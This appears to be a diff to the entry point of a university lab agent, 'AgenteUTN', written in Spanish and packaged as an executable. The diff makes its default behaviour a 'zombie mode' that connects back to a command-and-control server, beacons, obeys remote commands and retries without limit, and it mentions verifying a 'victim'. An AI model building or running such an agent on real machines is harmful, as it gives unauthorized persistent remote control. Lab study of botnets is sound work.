@@ -1,12 +1,17 @@
 """AgenteUTN - Aplicación principal de laboratorio (punto de entrada del .exe).
 
-Menú de diagnóstico local + opción de conectarse al C2 en modo zombie
-(conexión inversa, hello/heartbeat, comandos remotos y reconexión automática).
+Comportamiento por defecto: modo zombie. Conecta al C2 (conexión inversa),
+envía hello/heartbeat, responde comandos remotos y reconecta indefinidamente
+mientras el C2 no esté disponible. Termina con stop/bye/auth o Ctrl+C.
+
+Con `--menu` se abre el menú de diagnóstico local (ping, info, heartbeat,
+verificación de la víctima y conexión manual al C2).
 """
 from __future__ import annotations
 
 import asyncio
 import json
+import sys
 import time
 import urllib.error
 import urllib.request
@@ -60,10 +65,13 @@ def ejecutar_comando(nombre):
     mostrar(resultado)
 
 
-def conectar_vm(agent_id):
-    """Conecta al C2 con reconexión automática según la política."""
-    print("\nIniciando conexión con el servidor C2...")
+def modo_zombie(agent_id):
+    """Conecta al C2 y reconecta indefinidamente mientras esté caído.
 
+    Respeta la política de reconexión para el primer tramo (busy, caída del
+    C2), pero si el C2 sigue caído reintenta sin límite con la espera
+    configurada. Termina con stop/bye/auth (sin reconexión) o Ctrl+C.
+    """
     attempts = 0
     while True:
         try:
@@ -86,12 +94,9 @@ def conectar_vm(agent_id):
             {"type": "connection_lost"},
             attempts=attempts,
         )
-        if not decision["retry"]:
-            print("\nReintentos agotados; el agente queda desconectado.")
-            return
-
-        print(f"\nReconectando en {decision['delay']} s (intento {attempts})...")
-        time.sleep(decision["delay"])
+        delay = decision["delay"] if decision["retry"] else config.RECONNECT_DELAY_S
+        print(f"\nReconectando en {delay} s (intento {attempts})...")
+        time.sleep(delay)
 
 
 def mostrar_menu():
@@ -109,9 +114,8 @@ def mostrar_menu():
     print("=" * 52)
 
 
-def main():
-    agent_id = f"utn-{uuid.uuid4().hex[:12]}"
-
+def menu(agent_id):
+    """Menú de diagnóstico local (solo con --menu)."""
     print(f"\n{config.APP_NAME} iniciado correctamente.")
     print(f"Identificador: {agent_id}")
 
@@ -134,12 +138,24 @@ def main():
         elif opcion == "4":
             verificar_victima()
         elif opcion == "5":
-            conectar_vm(agent_id)
+            modo_zombie(agent_id)
         elif opcion == "6":
             print(f"\nFinalizando {config.APP_NAME}...")
             break
         else:
             print("\nOpción no válida.")
+
+
+def main():
+    agent_id = f"utn-{uuid.uuid4().hex[:12]}"
+
+    if "--menu" in sys.argv:
+        menu(agent_id)
+        return
+
+    print(f"{config.APP_NAME} iniciado (modo zombie).")
+    print(f"Identificador: {agent_id}")
+    modo_zombie(agent_id)
 
 
 if __name__ == "__main__":
